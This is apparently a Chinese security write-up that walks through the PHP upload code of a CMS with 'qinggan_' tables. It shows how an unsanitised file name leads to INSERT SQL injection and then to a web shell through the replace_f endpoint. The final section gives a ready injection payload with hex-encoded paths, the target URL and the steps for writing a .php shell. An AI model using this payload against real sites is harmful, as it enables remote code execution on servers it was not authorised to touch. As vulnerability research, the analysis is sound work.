    public function save_f()
    {
        if(!$this->site['upload_guest']){
            $this->json(P_Lang('系统已禁止游客上传，请联系管理员'));
        }
        $cateid = $this->get('cateid','int');
        $rs = $this->upload_base('upfile',$cateid);
        if(!$rs || $rs['status'] != 'ok'){
            $this->json($rs['error']);
        }
        unset($rs['status']);
        $rs['uploadtime'] = date("Y-m-d H:i:s",$rs['addtime']);
        $this->json($rs,true);
    }
这里调用了`$this->upload_base('upfile',$cateid);`进行文件上传
    private function upload_base($input_name='upfile',$cateid=0)
    {
        $rs = $this->lib('upload')->getfile($input_name,$cateid);
        if($rs["status"] != "ok"){
            return $rs;
        }
        $array = array();
        $array["cate_id"] = $rs['cate']['id'];
        $array["folder"] = $rs['folder'];
        $array["name"] = basename($rs['filename']);
        $array["ext"] = $rs['ext'];
        $array["filename"] = $rs['filename'];
        $array["addtime"] = $this->time;
        $array["title"] = $rs['title'];
        $array['session_id'] = $this->session->sessid();
        $arraylist = array("jpg","gif","png","jpeg");
        if(in_array($rs["ext"],$arraylist)){
            $img_ext = getimagesize($this->dir_root.$rs['filename']);
            $my_ext = array("width"=>$img_ext[0],"height"=>$img_ext[1]);
            $array["attr"] = serialize($my_ext);
        }
        $id = $this->model('res')->save($array);
        if(!$id){
            $this->lib('file')->rm($this->dir_root.$rs['filename']);
            return array('status'=>'error','error'=>P_Lang('图片存储失败'));
        }
        $this->model('res')->gd_update($id);
        $rs = $this->model('res')->get_one($id);
        $rs["status"] = "ok";
        return $rs;
    }
在upload_base当中，使用`$this->lib('upload')->getfile($input_name,$cateid);`获取上传的文件。
framework\libs\upload.php中：
    public function getfile($input='upfile',$cateid=0)
    {
        if(!$input){
            return array('status'=>'error','content'=>P_Lang('未指定表单名称'));
        }
        $this->_cate($cateid); //获取一个文件分类的预设 表名res_cate
        if(isset($_FILES[$input])){
            $rs = $this->_upload($input);
        }else{
            $rs = $this->_save($input);
        }
        if($rs['status'] != 'ok'){
            return $rs;
        }
        $rs['cate'] = $this->cate;
        return $rs;
    }
getfile()首先调用了`$this->_cate($cateid);`
获取cateid为1的文件分类预设，内容包括保存的地址，文件夹名称和文件类型。在数据库中：
接着调用了`$this->_upload($input)`：
    private function _upload($input)
    {
        $basename = substr(md5(time().uniqid()),9,16);
        $chunk = isset($_REQUEST["chunk"]) ? intval($_REQUEST["chunk"]) : 0;
        $chunks = isset($_REQUEST["chunks"]) ? intval($_REQUEST["chunks"]) : 1;
        $tmpname = $_FILES[$input]["name"];
        $tmpid = 'u_'.md5($tmpname);
        $ext = $this->file_ext($tmpname);
        $out_tmpfile = $this->dir_root.'data/cache/'.$tmpid.'_'.$chunk;
        if (!$out = @fopen($out_tmpfile.".parttmp", "wb")) {
            return array('status'=>'error','error'=>P_Lang('无法打开输出流'));
        }
        $error_id = $_FILES[$input]['error'] ? $_FILES[$input]['error'] : 0;
        if($error_id){
            return array('status'=>'error','error'=>$this->up_error[$error_id]);
        }
        if(!is_uploaded_file($_FILES[$input]['tmp_name'])){
            return array('status'=>'error','error'=>P_Lang('上传失败，临时文件无法写入'));
        }
        if(!$in = @fopen($_FILES[$input]["tmp_name"], "rb")) {
            return array('status'=>'error','error'=>P_Lang('无法打开输入流'));
        }
        while ($buff = fread($in, 4096)) {
            fwrite($out, $buff);
        }
        @fclose($out);
        @fclose($in);
        $GLOBALS['app']->lib('file')->mv($out_tmpfile.'.parttmp',$out_tmpfile.'.part');
        $index = 0;
        $done = true;
        for($index=0;$indexdir_root.'data/cache/'.$tmpid.'_'.$index.".part") ) {
                $done = false;
                break;
            }
        }
        if(!$done){
            return array('status'=>'error','error'=>'上传的文件异常');
        }
        $outfile = $this->folder.$basename.'.'.$ext;
        if(!$out = @fopen($this->dir_root.$outfile,"wb")) {
            return array('status'=>'error','error'=>P_Lang('无法打开输出流'));
        }
        if(flock($out,LOCK_EX)){
            for($index=0;$indexdir_root.'data/cache/'.$tmpid.'_'.$index.'.part','rb')){
                    break;
                }
                while ($buff = fread($in, 4096)) {
                    fwrite($out, $buff);
                }
                @fclose($in);
                $GLOBALS['app']->lib('file')->rm($this->dir_root.'data/cache/'.$tmpid."_".$index.".part");
            }
            flock($out,LOCK_UN);
        }
        @fclose($out);
        $tmpname = $GLOBALS['app']->lib('string')->to_utf8($tmpname);
        $title = str_replace(".".$ext,'',$tmpname);
        return array('title'=>$title,'ext'=>$ext,'filename'=>$outfile,'folder'=>$this->folder,'status'=>'ok');
    }
这里使用`$ext = $this->file_ext($tmpname);`获取文件的后缀，看下这个方法：
    private function file_ext($tmpname)
    {
        $ext = pathinfo($tmpname,PATHINFO_EXTENSION);
        if(!$ext){
            return false;
        }
        $ext = strtolower($ext);
        $cate_exts = ($this->cate && $this->cate['filetypes']) ? explode(",",$this->cate['filetypes']) : array('jpg','gif','png');
        if(!in_array($ext,$cate_exts)){
            return false;
        }
        return $ext;
    }
这里的文件类型就是`getfile()`中调用的`$this->_cate($cateid);`获取得到的，这里值为`png,jpg,gif,rar,zip`。
由于使用`in_array`，无法进行绕过。
接着回看前面，使用了`$tmpname = $_FILES[$input]["name"];`获取了文件名。
而$tmpname这个变量没有经过任何的处理，直接到了最后去除后缀名赋值给了$title变量。
$title变量作为数组中title的键值返回。
再回看`_upload`，返回的数组中的每个值赋值到`$array`当中。
接着调用了 `$id = $this->model('res')->save($array);` 跟踪过去：
framework\model\res.php：
    function save($data,$id=0)
    {
        if(!$data || !is_array($data)) return false;
        if($id){
            return $this->db->update_array($data,"res",array("id"=>$id));
        }else{
            return $this->db->insert_array($data,"res");
        }
    }
这里并没有赋值$id变量，进入到`$this->db->insert_array($data,"res");`，继续跟踪：
framework\engine\db\mysqli.php：
    public function insert_array($data,$tbl,$type="insert")
    {
        if(!$tbl || !$data || !is_array($data)){
            return false;
        }
        if(substr($tbl,0,strlen($this->prefix)) != $this->prefix){
            $tbl = $this->prefix.$tbl;
        }
        $type = strtolower($type);
        $sql = $type == 'insert' ? "INSERT" : "REPLACE";
        $sql.= " INTO ".$tbl." ";
        $sql_fields = array();
        $sql_val = array();
        foreach($data AS $key=>$value){
            $sql_fields[] = "`".$key."`";
            $sql_val[] = "'".$value."'";
        }
        $sql.= "(".(implode(",",$sql_fields)).") VALUES(".(implode(",",$sql_val)).")";
        return $this->insert($sql);
    }
一个foreach循环将数组中的键名转换为字段名，键值转为要插入的值。
上传一个文件名叫xiaonan.jpg，最后拼接出来的sql语句为：
    INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`session_id`,`attr`) VALUES('1','res/201910/05/','51514bdf089432f0.jpg','jpg','res/201910/04/51514bdf089432f0.jpg','1570161223','xiaonan','pf3qm0js3gb2s5f33r7lf14vl3','a:2:{s:5:"width";i:448;s:6:"height";i:400;}')
因为前面`_upload`中的`$tmpname`变量没有经过任何的处理，所以这里的xiaonan是可以控制的。这就会导致一个insert注入。
如果sql语句为：
    INSERT INTO test (`username`, `password`) VALUES('1', '2'), ('3','4');
则会在test表中插入两行数据，利用这个点。可以向数据库中插入一个文件名都可以由我们控制的数据。
再配合upload_control.php中的`replace_f`方法就可以进行getshell。
replace_f(是一个用作替换文件的方法):
    public function replace_f()
        {
            if(!$this->site['upload_guest']){
                $this->json(P_Lang('系统已禁止游客上传，请联系管理员'));
            }
            $id = $this->get("oldid",'int');
            if(!$id)
            {
                $this->json(P_Lang('没有指定要替换的附件'));
            }
            $old_rs = $this->model('res')->get_one($id);
            if(!$old_rs){
                $this->json(P_Lang('资源不存在'));
            }
            $rs = $this->lib('upload')->upload('upfile');
            if($rs["status"] != "ok")
            {
                $this->json(P_Lang('附件上传失败'));
            }
            $arraylist = array("jpg","gif","png","jpeg");
            $my_ext = array();
            if(in_array($rs["ext"],$arraylist))
            {
                $img_ext = getimagesize($rs["filename"]);
                $my_ext["width"] = $img_ext[0];
                $my_ext["height"] = $img_ext[1];
            }
            //替换资源
            $this->lib('file')->mv($rs["filename"],$old_rs["filename"]);
            $tmp = array("addtime"=>$this->time);
            $tmp["attr"] = serialize($my_ext);
            $this->model('res')->save($tmp,$id);
            //更新附件扩展信息
            $this->model('res')->gd_update($id);
            $rs = $this->model('res')->get_one($id);
            $this->json($rs,true);
        }
替换的步骤：
  1. 获取了一个参数名为oldid:`$id = $this->get("oldid",'int');`
  2. 使用`$this->model('res')->get_one($id);` 从数据库当中获取这个文件的信息传递给`$old_rs`变量
  3. 使用`$this->lib('upload')->upload('upfile');`获取新上传的文件信息传递给`$rs`变量。
  4. 使用`$this->lib('file')->mv($rs["filename"],$old_rs["filename"]);`进行文件的替换
来看mv()方法
    /**
         * 文件移动操作
         * @参数 $old 旧文件（夹）
         * @参数 $new 新文件（夹）
         * @参数 $recover 是否覆盖
         * @返回 false/true
        **/
        public function mv($old,$new,$recover=true)
        {
            if(!file_exists($old)){
                return false;
            }
            if(substr($new,-1) == "/"){
                $this->make($new,"dir"); //创建文件夹
            }else{
                $this->make($new,"file"); //创建文件
            }
            if(file_exists($new)){
                if($recover){
                    unlink($new);
                }else{
                    return false;
                }
            }else{
                $new = $new.basename($old);
            }
            rename($old,$new);
            return true;
        }
从这个方法的定义当中就可以得知，会将新上传的文件名改为指定的id所获取到的文件名。
因为前面的Insert型的sql注入，我们能控制一个文件信息的文件名。
可以构造一个文件名以php结尾插入到数据库当中，当利用replace_f方法上传一个包含恶意php代码的文件时，就会写入一个.php后缀的文件，导致getshell。
文件信息在数据库当中：
于是构造文件名为：
    1','pf3qm0js3gb2s5f33r7lf14vl3','30'),('1','res/201910/05/','shell.jpg','jpg','res/201910/05/shell.php','1570161575','abc
由于文件名无法包含`/`，所以把包含`/`的部分转换为16进制(前面加0x)：
    1','pf3qm0js3gb2s5f33r7lf14vl3','30'),('1',0x7265732f3230313931302f30352f,'shell.jpg','jpg', 0x7265732f3230313931302f30352f7368656c6c2e706870,'1570161575','abc
上传后数据库中的文件信息：
由于上传后返回的图片的id是第一个数据，需要把id+1再赋值到replace中的oldid中。
上传时调用Replace_f的地址：
    http://localhost/index.php?c=upload&f=replace&oldid=1
将上传的文件内容改为php代码上传即可。
PS：这里除了配合`replace_f`之外，修改文件的信息也可导致后台的储存型XSS。